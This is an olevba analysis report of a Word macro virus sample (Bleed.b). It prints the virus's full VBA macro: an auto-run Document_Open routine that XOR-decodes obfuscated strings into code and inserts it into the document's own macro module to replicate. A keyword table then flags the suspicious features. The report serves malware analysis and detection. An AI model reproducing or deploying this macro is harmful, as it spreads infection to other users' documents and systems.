olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bleed.b-d93b49b24dd6d8e1fb36ffb109eb3ace0fa95c15
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bleed.b-d93b49b24dd6d8e1fb36ffb109eb3ace0fa95c15 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Dim jacky(15) As String
jacky(1) = "Шщ·Тееше·Етдвът·Щтпг­·Дтг·т·Є·ЪцфешФшщгцющте­·г·Є·¦"
jacky(2) = "ДтгЦгге·ЩшеъцыГтъзыцгт№СвыыЩцът»·бхЩшеъцы"
jacky(3) = "Дтг·а·Є·т№БХЗешэтфг­·Шзгюшщд№БюевдЗешгтфгюшщ·Є·їЕщу·Ѕ·§ѕ­·Шзгюшщд№ДцбтЩшеъцыЗешъзг·Є·їЕщу·Ѕ·§ѕ"
jacky(4) = "Дтг·ы·Є·а№БХФшъзшщтщгдїгѕ­·Дтг·р·Є·ы№ФшутЪшувыт"
jacky(5) = "Дтг·д·Є·ЩшеъцыГтъзыцгт­·Дтг·гя·Є·д№БХЗешэтфг№БХФшъзшщтщгдїгѕ№ФшутЪшувыт"
jacky(6) = "х·Є·р№ыющтдїг»·ҐЎѕ·±·бхФе·±·р№ыющтдїЈ¤»·¦ѕ"
jacky(7) = "Юс·т·Є·д·Гятщ"
jacky(8) = "Дтг·д·Є·ЦфгюбтУшфвътщг­·Дтг·гя·Є·д№БХЗешэтфг№БХФшъзшщтщгдїгѕ№ФшутЪшувыт"
jacky(9) = "Тщу·Юс"
jacky(10) = "Юс·гя№ыющтдїг»·гѕ·Є·§·Гятщ"
jacky(11) = "гя№УТыТгтЫЮщтД·г»·гя№фШвщгшсЫЮщТд­·гя№ЦууСешъДгеющр·х"
jacky(12) = "Тщу·Юс"
jacky(13) = "ГяюдУшфвътщг№БХЗешэтфг№БХФшъзшщтщгдїгѕ№ФшутЪшувыт№УТыТгтЫЮщтД·Ґ »·¦Ў"
jacky(14) = "Юс·УцоїЩшаїѕѕ·Є·їЮщгїЕщу·Ѕ·¦ўѕѕ·Гятщ·ЪдрХшп·µФюцш·Дыцртяцъъте¶·Фшът·дгцюЁµ»·§»·µФыцдд№Дыцртяцъъте·л·эцфь·гашсышате·ё·ЫющтНте§·ё·Ътгцзяцдтµ"
jacky(15) = "ЦфгюбтУшфвътщг№ДцбтЦд·ЦфгюбтУшфвътщг№СвыыЩцът"
For y = 1 To 15: V = V & dc(jacky(y), 151) & vbCr: Next
If ThisDocument.VBProject.VBComponents(1).CodeModule.lines(28, 1) = "" Then ThisDocument.VBProject.VBComponents(1).CodeModule.InsertLines 27, V
differ
End Sub
Private Function dc(a, e)
For i = 1 To Len(a): t = t & Chr(Asc(Mid(a, i, 1)) Xor e): Next i
dc = t
End Function
Private Sub differ()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

